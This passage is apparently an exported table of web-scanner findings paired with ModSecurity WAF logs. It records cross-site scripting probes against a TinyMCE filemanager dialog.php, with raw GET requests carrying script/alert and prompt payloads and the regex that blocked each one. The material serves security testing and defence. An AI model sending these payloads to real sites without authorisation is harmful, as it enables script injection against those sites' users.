</td><td class=xl24 width=64 >2015-04-01 09:30:01</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:00 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(253699)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttQKwQAW0AAHchlV0AAAAE&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttQKwQAW0AAHchlV0AAAAE</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366949</td><td class=xl24 width=64 >2015-03-31 23:40:37</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >type</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=&quot;&gt;&lt;script&gt;alert(507699)&lt;/script&gt;&lt;!--&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=6t4dsckpu62jnrduh4619dkgf3
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:02</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:01 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:type. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(507699)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttQawQAW0AAHgzv08AAAAG&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttQawQAW0AAHgzv08AAAAG</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366950</td><td class=xl24 width=64 >2015-03-31 23:41:58</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f89d6ce</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&lt;script&gt;prompt(970599)&lt;/script/&gt;&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f89d6ce=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=dujlq0nl544jno8j23so9r92s1
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:04</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:02 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;&lt;script&gt;prompt(970599)&lt;/script/&gt;&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttQqwQAW0AAB7zKNwAAAAF&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttQqwQAW0AAB7zKNwAAAAF</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366951</td><td class=xl24 width=64 >2015-03-31 23:44:03</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >lang</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=&quot;&gt;&lt;script&gt;alert(709399)&lt;/script&gt;&lt;!--&amp;popup=0&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=i60mo0blnk7oeicfg7udia46h5
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:05</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:04 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:lang. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(709399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttRKwQAW0AAHhGMuUAAAAK&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttRKwQAW0AAHhGMuUAAAAK</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366952</td><td class=xl24 width=64 >2015-03-31 23:45:22</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f89d6ce</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(776299)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f89d6ce=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=edrpcc0sm19ntsiog2qffvdt41
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:06</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:05 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(776299)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttRawQAW0AAHzDqssAAAAH&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttRawQAW0AAHzDqssAAAAH</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366953</td><td class=xl24 width=64 >2015-03-31 23:48:47</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=&amp;551ac2f89d6ce</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >crossdomain</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=&quot;&gt;&lt;script&gt;alert(466899)&lt;/script&gt;&lt;!--&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=TestName&amp;551ac2f89d6ce=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=TestName%2F; PHPSESSID=ku4ve4np5ang4tvkft2egatga6
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:07</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:06 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:crossdomain. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(466899)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttRqwQAW0AAHewA9sAAAAN&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttRqwQAW0AAHewA9sAAAAN</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366954</td><td class=xl24 width=64 >2015-03-31 23:49:10</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup='&gt;&lt;script&gt;alert(888399)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_url=0&amp;akey=key&amp;fldr=test/&amp;551ac2f8dd2f6=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=sdpofi49ejceajh652u50jdhj7
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:09</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:07 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;'&gt;&lt;script&gt;alert(888399)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttR6wQAW0AABvT@HcAAAAL&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttR6wQAW0AABvT@HcAAAAL</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366955</td><td class=xl24 width=64 >2015-03-31 23:50:55</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
This vulnerability is often caused by server-side scripts written in languages such as PHP, ASP, .NET, Perl or Java,
 which do not adequately filter data sent along with page requests or by vulnerable HTTP servers.

This malicious code appears to come from your Web application when it runs in the browser of an unsuspecting user.&lt;/p&gt;


&lt;p&gt;An attacker can do the following damage with an expoloit script:


&lt;ul&gt;
&lt;li&gt;access other sites inside another client&amp;#39;s private intranet&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s cookie(s)&lt;/li&gt;
&lt;li&gt;steal another client&amp;#39;s submitted form data&lt;/li&gt;
&lt;li&gt;modify another client&amp;#39;s submitted form data before it reaches the server&lt;/li&gt;
&lt;li&gt;submit a form to your Web application on the user&amp;#39;s behalf that modifies passwords or other application data&lt;/li&gt;&lt;/ul&gt;

&lt;/p&gt;



&lt;p&gt;The two most common methods of attack are:

&lt;ul&gt;
&lt;li&gt;Having a user click a URL link sent in an e-mail&lt;/li&gt;
&lt;li&gt;Having a user click  a URL link while visiting a Web site&lt;/li&gt;&lt;/ul&gt;
&lt;/p&gt;


&lt;p&gt;In both scenarios, the URL will generally link to the trusted site, but will contain additional data that is used to
 trigger the XSS attack.&lt;/p&gt;


&lt;p&gt;Note that SSL connectivity does not protect against this issue.&lt;/p&gt;</td><td class=xl24 width=64 >http://203.17.194.79/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=0&amp;crossdomain=0&amp;field_id=&amp;relative_0&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8</td><td class=xl24 width=64 >get</td><td class=xl24 width=64 >popup</td><td class=xl24 width=64 >GET /edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php?type=0&amp;lang=en_EN&amp;popup=&quot;&gt;&lt;script&gt;alert(678499)&lt;/script&gt;&lt;!--&amp;crossdomain=0&amp;field_id=100&amp;relative_0=TestName&amp;akey=key&amp;fldr=test/&amp;551ac2f761bb8=TestName HTTP/1.1
Referer: http://203.17.194.79/edelweiss/admin/index.php
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31
Accept: */*
Host: 203.17.194.79
Cookie: last_position=test%2F; PHPSESSID=mai39le2meuad7i8lbm23dao21
Connection: Close

</td><td class=xl24 width=64 >2015-04-01 09:30:10</td><td class=xl24 width=64 >406</td><td class=xl24 width=64 >[Wed Apr 01 09:30:09 2015] [error] [client 54.173.252.77] ModSecurity: Access denied with code 406 (phase 2). Pattern match &quot;(?:\\\\b(?:(?:type\\\\b\\\\W*?\\\\b(?:text\\\\b\\\\W*?\\\\b(?:j(?:ava)?|ecma|vb)|application\\\\b\\\\W*?\\\\bx-(?:java|vb))script|c(?:opyparentfolder|reatetextrange)|get(?:special|parent)folder|iframe\\\\b.{0,100}?\\\\bsrc)\\\\b|on(?:(?:mo(?:use(?:o(?:ver|ut)|down|move|up)|ve)| ...&quot; at ARGS:popup. [file &quot;/etc/apache2/sites-enabled/000-default-indusind-base.conf&quot;] [line &quot;492&quot;] [id &quot;94&quot;] [msg &quot;Cross-site Scripting (XSS) Attack&quot;] [data &quot;\\x22&gt;&lt;script&gt;alert(678499)&lt;/script&gt;&lt;!--&quot;] [severity &quot;CRITICAL&quot;] [tag &quot;WEB_ATTACK/XSS&quot;] [hostname &quot;54.173.252.77&quot;] [uri &quot;/edelweiss/admin/js/tinymce/plugins/filemanager/dialog.php&quot;] [unique_id &quot;VRttSawQAW0AAHhB778AAAAD&quot;]</td><td class=xl24 width=64 >94</td><td class=xl24 width=64 >VRttSawQAW0AAHhB778AAAAD</td></tr><tr><td class=xl24 width=64 >3012</td><td class=xl24 width=64 >8366956</td><td class=xl24 width=64 >2015-03-31 23:52:12</td><td class=xl24 width=64 >&lt;p&gt;The Web application is vulnerable to cross-site scripting (XSS), which allows attackers to take advantage of
 Web server scripts to inject JavaScript or HTML code that is executed on the client-side browser.
 
